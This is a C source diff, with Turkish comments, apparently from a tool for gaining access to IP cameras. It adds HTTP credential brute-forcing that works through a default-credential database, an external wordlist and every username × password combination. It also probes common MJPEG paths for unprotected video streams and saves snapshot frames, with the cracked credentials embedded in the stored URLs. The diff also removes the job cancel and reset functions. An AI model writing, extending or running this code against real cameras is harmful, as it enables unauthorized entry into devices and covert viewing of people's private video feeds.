@@ -20,6 +20,7 @@
 #include <errno.h>
 #include <fcntl.h>
 #include <signal.h>
+#include <unistd.h>
 #include <sys/wait.h>
 #include <sys/select.h>
 #include <sys/time.h>
@@ -321,7 +322,7 @@ static int ca_build_paths(const char *base_url, char paths[][128], int maxp) {
 
 /* Basic + ffmpeg ile tek bir kimlik ciftini dene.
  *
- * Onemli: bazi sunucular (or. mediamtx) kimlik dogrulamayi yol
+ * Onemli: bazi RTSP sunuculari kimlik dogrulamayi yol
  * cozumlemesinden ONCE yapar; bu yuzden kimliksiz her yol 401 doner ve
  * bulunan "ilk 401 yolu" gercek akis olmayabilir. Kimlik dogru oldugunda
  * yanlis yol 404 dondurur; bu durumda kimligi diger aday yollarda da
@@ -369,6 +370,115 @@ static int ca_try_one_cred(int idx, const char *ip, int port, const char *path,
         ca_bump_tried(idx);
     }
     return ca_is_cancelled(idx) ? -1 : 0;
+}
+
+/* Ilk JPEG/PNG karesini HTTP uzerinden cekmeyi deneyen yardimci; MJPEG
+ * multipart govdelerden de kare ayiklar (camera_access_snapshot ile ayni). */
+static int ca_fetch_binary(const char *ip, int port, const char *path,
+                           const char *user, const char *pass,
+                           const char *out_path, int timeout_ms);
+
+/* HTTP uzerinden kimlik dogrula; basariliysa kare cekip job'u FOUND yapar.
+ * Doner: 1 bulundu, 0 tutmadi, -1 iptal. */
+static int ca_try_cred_http(int idx, const char *ip, int http_port,
+                            const char *vendor, const char *user,
+                            const char *pass) {
+    int hp = http_port > 0 ? http_port : 80;
+    char detail[CA_ERR_LEN] = "";
+    char sess[512] = "";
+    if (camera_vuln_http_auth(ip, hp, 0, vendor, user, pass,
+                              sess, sizeof(sess), NULL, 0,
+                              detail, sizeof(detail)) != 1)
+        return 0;
+    if (ca_is_cancelled(idx)) return -1;
+
+    /* Kare cekmeyi dene (kesin kanit + kullanilabilir goruntu). */
+    char saved[256] = "";
+    int snapi = -1;
+    int np = 0;
+    const char *const *sp = camera_vuln_snapshot_paths(&np);
+    for (int i = 0; i < np; i++) {
+        if (ca_is_cancelled(idx)) return -1;
+        char tmppath[256];
+        snprintf(tmppath, sizeof(tmppath), "/tmp/.beat_ca_snap_%d_%d.jpg",
+                 (int)getpid(), idx);
+        if (ca_fetch_binary(ip, hp, sp[i], user, pass, tmppath, 2200) == 0) {
+            snprintf(saved, sizeof(saved), "%s", tmppath);
+            snapi = i;
+            break;
+        }
+    }
+
+    platform_mutex_lock(&g_lock);
+    CameraAccessJob *j = &g_jobs[idx];
+    j->state = CA_FOUND;
+    j->open_stream = 0;
+    snprintf(j->found_user, CA_USER_LEN, "%s", user);
+    snprintf(j->found_pass, CA_PASS_LEN, "%s", pass ? pass : "");
+    if (snapi >= 0) {
+        snprintf(j->found_url, CAM_URL_LEN, "http://%s:%s@%s:%d%s",
+                 user, pass ? pass : "", ip, hp, sp[snapi]);
+        snprintf(j->snapshot_path, sizeof(j->snapshot_path), "%s", saved);
+        snprintf(j->last_error, CA_ERR_LEN, "HTTP erisim + kare: %.80s",
+                 detail[0] ? detail : "ok");
+    } else {
+        snprintf(j->found_url, CAM_URL_LEN, "http://%s:%d/", ip, hp);
+        snprintf(j->last_error, CA_ERR_LEN, "HTTP kimlik dogrulandi: %.80s",
+                 detail[0] ? detail : "ok");
+    }
+    platform_mutex_unlock(&g_lock);
+    return 1;
+}
+
+/* Tum aday kimlikleri (varsayilan DB + harici wordlist + kombinasyon) HTTP ile
+ * sirayla dener. Butce ile sinirlanir. Doner: 1 bulundu, 0 tutmadi, -1 iptal. */
+static int ca_run_http_creds(int idx, const char *ip, int http_port,
+                             const char *vendor, const CameraAccessJob *cfg) {
+    /* elle kimlik once */
+    if (cfg->manual_user[0] || cfg->used_manual) {
+        ca_set_status(idx, "HTTP: elle kimlik deneniyor...");
+        int rc = ca_try_cred_http(idx, ip, http_port, vendor,
+                                  cfg->manual_user, cfg->manual_pass);
+        if (rc != 0) return rc;
+    }
+
+    double t0 = ca_now();
+    const double budget = 70.0;   /* HTTP asamasi icin toplam saniye butcesi */
+
+    /* 1) varsayilan DB + wordlist */
+    int nd = 0, nw = 0;
+    const CamCred *def = camera_vuln_default_creds(&nd);
+    const CamCred *wl  = camera_vuln_wordlist_creds(&nw);
+    for (int pass_i = 0; pass_i < 2; pass_i++) {
+        const CamCred *tab = pass_i == 0 ? def : wl;
+        int nt = pass_i == 0 ? nd : nw;
+        for (int i = 0; tab && i < nt; i++) {
+            if (ca_now() - t0 > budget) return 0;
+            if (ca_is_cancelled(idx)) return -1;
+            platform_mutex_lock(&g_lock);
+            snprintf(g_jobs[idx].last_error, CA_ERR_LEN,
+                     "HTTP kimlik: %s/%.12s", tab[i].user, tab[i].pass);
+            platform_mutex_unlock(&g_lock);
+            int rc = ca_try_cred_http(idx, ip, http_port, vendor,
+                                      tab[i].user, tab[i].pass);
+            if (rc != 0) return rc;
+        }
+    }
+
+    /* 2) kombinasyon (kullanici x parola) — butce dahilinde */
+    int nu = 0, npw = 0;
+    const char *const *us = camera_vuln_usernames(&nu);
+    const char *const *ps = camera_vuln_passwords(&npw);
+    for (int ui = 0; ui < nu; ui++) {
+        for (int pi = 0; pi < npw; pi++) {
+            if (ca_now() - t0 > budget) return 0;
+            if (ca_is_cancelled(idx)) return -1;
+            int rc = ca_try_cred_http(idx, ip, http_port, vendor,
+                                      us[ui], ps[pi]);
+            if (rc != 0) return rc;
+        }
+    }
+    return 0;
 }
 
 static void ca_process(int idx) {
@@ -419,6 +529,44 @@ static void ca_process(int idx) {
     }
 
     if (!need_auth || !found_path[0]) {
+        /* --- Asama 1c: RTSP'de yol/kimlik yoksa acik HTTP/MJPEG akisini dene ---
+         * Gercek IP kameralarin ve MJPEG-over-HTTP sunucularin korumasiz
+         * akislarini yakalar; boylece otonom zincir yalniz RTSP'ye bagli kalmaz. */
+        if (cfg.http_port > 0) {
+            static const char *mj_paths[] = {
+                "/stream.mjpg", "/mjpg/video.mjpg", "/video", "/video.mjpg",
+                "/mjpeg", "/?action=stream", "/videostream.cgi", NULL
+            };
+            for (int mi = 0; mj_paths[mi]; mi++) {
+                if (ca_is_cancelled(idx)) return;
+                char tmppath[128];
+                snprintf(tmppath, sizeof(tmppath), "/tmp/.beat_ca_mjpeg_%d.jpg", (int)getpid());
+                const char *u = cfg.manual_user[0] ? cfg.manual_user : NULL;
+                if (ca_fetch_binary(cfg.ip, cfg.http_port, mj_paths[mi], u,
+                                    cfg.manual_pass, tmppath, 2500) == 0) {
+                    unlink(tmppath);
+                    platform_mutex_lock(&g_lock);
+                    CameraAccessJob *j = &g_jobs[idx];
+                    j->state = CA_FOUND;
+                    j->open_stream = 1;
+                    snprintf(j->found_url, CAM_URL_LEN, "http://%s:%d%s",
+                             cfg.ip, cfg.http_port, mj_paths[mi]);
+                    snprintf(j->path, sizeof(j->path), "%s", mj_paths[mi]);
+                    snprintf(j->last_error, CA_ERR_LEN, "acik MJPEG akis (HTTP)");
+                    platform_mutex_unlock(&g_lock);
+                    return;
+                }
+            }
+        }
+        /* RTSP'de yol bulunamadiysa HTTP uzerinden de kimlik dene:
+         * bazi kameralar yalniz web arayuzu (ve HTTP kare ucu) sunar. */
+        {
+            int hpx = cfg.http_port > 0 ? cfg.http_port : 80;
+            ca_set_status(idx, "RTSP yolu yok; HTTP kimlik deneniyor...");
+            int hr = ca_run_http_creds(idx, cfg.ip, hpx,
+                                       cfg.vendor[0] ? cfg.vendor : NULL, &cfg);
+            if (hr != 0) return;
+        }
         ca_finish_fail(idx, "gecerli RTSP yolu bulunamadi");
         return;
     }
@@ -473,6 +621,17 @@ static void ca_process(int idx) {
         int rc = ca_try_one_cred(idx, cfg.ip, port, found_path, paths, np,
                                  creds[i].user, creds[i].pass, 1);
         if (rc != 0) return;
+    }
+
+    /* --- Asama 3b: HTTP kimlik dogrulamasi (RTSP tutmadiysa) ---
+     * Genis DB + harici wordlist + kullanici x parola kombinasyonunu HTTP
+     * uzerinden dener; basarili olursa kare cekip kanit olarak kaydeder. */
+    if (cfg.http_port > 0 || cfg.vendor[0]) {
+        int hpx = cfg.http_port > 0 ? cfg.http_port : 80;
+        ca_set_status(idx, "HTTP kimlik dogrulamasi...");
+        int hr = ca_run_http_creds(idx, cfg.ip, hpx,
+                                   cfg.vendor[0] ? cfg.vendor : NULL, &cfg);
+        if (hr != 0) return;
     }
 
     /* --- Asama 4: ONVIF ile akis adresi (RTSP kimlikleri tutmadiysa) --- */
@@ -612,15 +771,6 @@ int camera_access_try_credentials(const char *ip, const char *user,
     return 0;
 }
 
-void camera_access_cancel(const char *ip) {
-    if (!g_init) return;
-    platform_mutex_lock(&g_lock);
-    int idx = ca_find(ip);
-    if (idx >= 0 &&
-        (g_jobs[idx].state == CA_QUEUED || g_jobs[idx].state == CA_RUNNING))
-        g_jobs[idx].state = CA_CANCELLED;
-    platform_mutex_unlock(&g_lock);
-}
 
 int camera_access_get(const char *ip, CameraAccessJob *out) {
     if (!g_init || !ip || !out) return 0;
@@ -643,14 +793,6 @@ int camera_access_busy(const char *ip) {
     return b;
 }
 
-void camera_access_reset(void) {
-    if (!g_init) return;
-    platform_mutex_lock(&g_lock);
-    for (int i = 0; i < g_job_count; i++)
-        if (g_jobs[i].state != CA_RUNNING && g_jobs[i].state != CA_QUEUED)
-            memset(&g_jobs[i], 0, sizeof(g_jobs[i]));
-    platform_mutex_unlock(&g_lock);
-}
 
 /* ===================== Kesif baglami + snapshot ===================== */
 void camera_access_set_context(const char *ip, int http_port, const char *vendor) {
@@ -745,6 +887,20 @@ static int ca_fetch_binary(const char *ip, int port, const char *path,
             int blen = total - (int)(hdr - buf);
             int img = (blen > 3 && hdr[0] == 0xFF && hdr[1] == 0xD8) ||
                       (blen > 8 && hdr[0] == 0x89 && hdr[1] == 'P');
+            if (!img && blen > 4) {
+                /* MJPEG multipart (multipart/x-mixed-replace): ilk JPEG
+                 * SOI..EOI parcasini govdeden ayikla. */
+                for (int i = 0; i + 1 < blen; i++) {
+                    if (hdr[i] == 0xFF && hdr[i + 1] == 0xD8) {
+                        int e = -1;
+                        for (int k = i + 2; k + 1 < blen; k++) {
+                            if (hdr[k] == 0xFF && hdr[k + 1] == 0xD9) { e = k + 1; break; }
+                        }
+                        if (e > i) { hdr += i; blen = e - i + 1; img = 1; }
+                        break;
+                    }
+                }
+            }
             if (img) {
                 FILE *f = fopen(out_path, "wb");
                 if (f) {
